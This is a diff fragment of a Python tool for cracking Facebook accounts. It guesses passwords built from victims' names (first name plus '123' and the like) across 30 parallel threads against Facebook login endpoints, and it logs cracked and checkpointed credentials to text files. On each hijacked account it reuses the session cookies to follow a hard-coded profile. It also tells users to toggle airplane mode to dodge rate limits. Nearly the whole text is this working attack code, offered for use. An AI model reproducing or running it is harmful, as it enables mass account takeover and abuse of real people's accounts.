+                        year  = ''
+                    except:
+                        pass
+                    print('\r%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
+                    wrt = '%s|%s' % (user,pw)
+                    cp.append(wrt)
+                    open('ANCHAL-RAJA_CP.txt' , 'a').write('%s\n' % wrt)
+                    break
+                else:
+                    continue
+            loop+=1
+        except:
+            self.__metode__(user, pw, cebok)
+    def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100081530106222', cookies={'cookie': coki}).text, 'html.parser')
+        get = r.find('a', string='Ikuti').get('href')
+        session.get(('https://free.facebook.com' + str(get)), cookies={'cookie': coki}).text
+
+    def __pler__(self):
+        print('1.       PASS1 VIP ')
+        print('2.       PASS2 VIP ')
+        chi = input('\n        Choose: ')
+        if chi == '':
+            print('\nSelect Correct One')
+            self.__pler__()
+        elif chi in ('1', '01'):
+            os.system("clear")
+            print(logo)
+            print("\033[1;97m\rUse flight (airplane) mode before use\033[1;97m")
+            print(47*"-")
+            print('\033[1;97m Total IDs : %s ' % len(self.id))
+            print(47*"-")
+            with ahmadAXI(max_workers=30) as AXIworld:
+                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
+                    try:
+                        uid, name = zsb.split('|')
                         xz = name.split(' ')
+                        first, last = name.split(' ')
+                        firstl = first.lower()
+                        lastl = last.lower()
+                        firsts = first.capitalize()
+                        lasts = last.capitalize()
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                             pwx = [name,xz[0]+'123',xz[0]+'1234',xz[0]+'12345',xz[0]+'123456']
                         else:
                             pwx = [name,xz[0]+'123',xz[0]+'1234',xz[0]+'12345',xz[0]+'123456']
-                        kirim.submit(self.__metode__, uid, pwx, "m.facebook.com")
+                        AXIworld.submit(self.__metode__, uid, pwx, "free.facebook.com")
                     except:
                         pass
-
             hasil(ok,cp)
+        elif chi in ('2', '02'):
+            os.system("clear")
+            print(logo)
+            print("\033[1;97m\rUse flight (airplane) mode before use\033[1;97m")
+            print(47*"-")
+            print('\033[1;97m Total IDs : %s ' % len(self.id))
+            print(47*"-")
+            with ahmadAXI(max_workers=30) as AXIworld:
+                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
+                    try:
+                        uid, name = zsb.split('|')
+                        xz = name.split(' ')                      
+                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+                            pwx = [xz[0]+xz[1]]                         
+                            pwx = [xz[0]+xz[1]]
+                        else:
+                            pwx = [xz[0]+xz[1]] 
+                        AXIworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                    except:
+                        pass
+            hasil(ok,cp)
+class __xxxxx__:
+    def __init__(self):
+        self.id = []
+    def malikx(self,id):
+        os.system("clear")
+        print(logo)
+        self.cnt = input('_____Put File Name : ')
+        self.id = open(self.cnt).read().splitlines()
+        os.system('clear')
+        print(logo)
+        print("")
+        ___worldwide___ = ('y')
+        if ___worldwide___ in ('yes','Yes','Y', 'y'):
+            self.__pler__()
         else:
-            print('\n Select Valid One');self.__pler__()
+            print(' [!] Choose Correct One');
+            self.ahmadx(id)
+    def __metode__(self, user, __chi__, cebok):
+        global ok,cp,loop
 
+        sys.stdout.write('\r\033[1;96m \033][1;32m%s|%s \033[1;32m[OK:%s] '%(loop,len(self.id),len(ok))),
+        sys.stdout.flush()
+        try:
+            for pw in __chi__:
+                pw = pw.lower()
+                session=requests.Session()
+                header={
+                    "Host":cebok,
+                    "upgrade-insecure-requests":"1",
+                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5",
+                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                    "sec-fetch-site":"none",
+                    "sec-fetch-mode":"navigate",
+                    "sec-fetch-user":"?1",
+                    "sec-fetch-dest":"document",
+                    "referer":"https://free.facebook.com/home.php?paipv=0&eav=Afa8cdXXzTK4k6D5wodkhfGjILmckqBRc7sVaG4Tl5rkKOo8S7h7qx5rvZWXJ4gpq14&tbua=1",
+                    "accept-encoding":"gzip, deflate br",
+                    "accept-language":"en-US,en;q=0.9",
+                     "cache-control":"max-age=0",
+                }                       
+                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
+                das = {
+                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
+                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
+                    "uid":user,
+                    "flow":"login_no_pin",
+                    "pass":pw,
+                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
+                }
+                header1 = {
+                    "Host":cebok,
+                    "upgrade-insecure-requests":"1",
+                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5",
+                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                    "sec-fetch-site":"none",
+                    "sec-fetch-mode":"navigate",
+                    "sec-fetch-user":"?1",
+                    "sec-fetch-dest":"document",
+                    "referer":"https://free.facebook.com/home.php?paipv=0&eav=Afa8cdXXzTK4k6D5wodkhfGjILmckqBRc7sVaG4Tl5rkKOo8S7h7qx5rvZWXJ4gpq14&tbua=1",
+                    "accept-encoding":"gzip, deflate br",
+                    "accept-language":"en-US,en;q=0.9",
+                     "cache-control":"max-age=0",
+                }
+                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
+                if 'c_user' in session.cookies.get_dict():
+                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                    print(f"\r{H} [ANCHAL-RAJA-OK] {user} | {pw}")
+                    wrt = '%s|%s' % (user,pw)
+                    ok.append(wrt)
+                    open('OK.txt' , 'a').write('%s\n' % wrt)
+                    self.follow(session,coki)
+                    break
+                elif 'checkpoint' in session.cookies.get_dict():
+                    try:
+                        tokenz = open('.token.txt').read()
+                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
+                        month, day, year = cp_ttl.split('/')
+                        month = bulan_ttl[month]
+                        print('r\%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
+                        wrt = '%s|%s' % (user,pw)
+                        cp.append(wrt)
+                        open('CP.txt' , 'a').write('%s\n' % wrt)
+                        break
+                    except (KeyError, IOError):
+                        month = ''
+                        day   = ''
+                        year  = ''
+                    except:
+                        pass
+                    print('\r%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
+                    wrt = '%s|%s' % (user,pw)
+                    cp.append(wrt)
+                    open('ANCHAL-RAJA -CP.txt' , 'a').write('%s\n' % wrt)
+                    break
+                else:
+                    continue
+            loop+=1
+        except:
+            self.__metode__(user, pw, cebok)
+    def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100081530106222', cookies={'cookie': coki}).text, 'html.parser')
+        get = r.find('a', string='Ikuti').get('href')
+        session.get(('https://m.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
-if __name__ == '__main__':
-    bsn_menu()
+    def __pler__(self):
+        print('1.       PASS1 VIP ')
+        print('2.       PASS2 VIP ')
+        chi = input('\n        Choose: ')
+        if chi == '':
+            print('\nSelect Correct One')
+            self.__pler__()
+        elif chi in ('1', '01'):
+            os.system("clear")
+            print(logo)
+            print("\033[1;97m\rUse flight (airplane) mode before use\033[1;97m")
+            print(47*"-")
+            print('\033[1;97m Total IDs : %s ' % len(self.id))
+            print(47*"-")
+            with ahmadAXI(max_workers=30) as AXIworld:
+                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
+                    try:
+                        uid, name = zsb.split('|')
+                        xz = name.split(' ')
+                        first, last = name.split(' ')
+                        firstl = first.lower()
+                        lastl = last.lower()
+                        firsts = first.capitalize()
+                        lasts = last.capitalize()
+                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+                            pwx = [firstl+' '+lastl]
+                        else:
+                            pwx = [firstl+' '+lastl]
+                            pwx = [firstl+' '+lastl]
+                        AXIworld.submit(self.__metode__, uid, pwx, "m.facebook.com")
+                    except:
+                        pass
+            hasil(ok,cp)
+        elif chi in ('2', '02'):
+            os.system("clear")
+            print(logo)
+            print("\033[1;97m\rUse flight (airplane) mode before use\033[1;97m")
+            print(47*"-")
+            print('\033[1;97m Total IDs : %s ' % len(self.id))
+            print(47*"-")
+            with ahmadAXI(max_workers=30) as AXIworld:
+                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
+                    try:
+                        uid, name = zsb.split('|')
+                        xz = name.split(' ')
+                        first, last = name.split(' ')
+                        firstl = first.lower()
+                        lastl = last.lower()
+                        firsts = first.capitalize()
+                        lasts = last.capitalize()
+                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+                           pwx = [name,xz[0]+'123',xz[0]+'1234',xz[0]+'12345',xz[0]+'123456']
+                        else:
+                            pwx = [name,xz[0]+'123',xz[0]+'1234',xz[0]+'12345',xz[0]+'123456']
+                        AXIworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                    except:
+                        pass
+            sys.stdout.write(f"\r \x1b[1;32m[Anchal]\x1b[1;32m [{loop}|{tl}] \x1b[1;92m[OK][{len(oks)}] [CP][{len(cps)}]  ")
+print('chk update')
+os.system('git pull')
+ahmad()
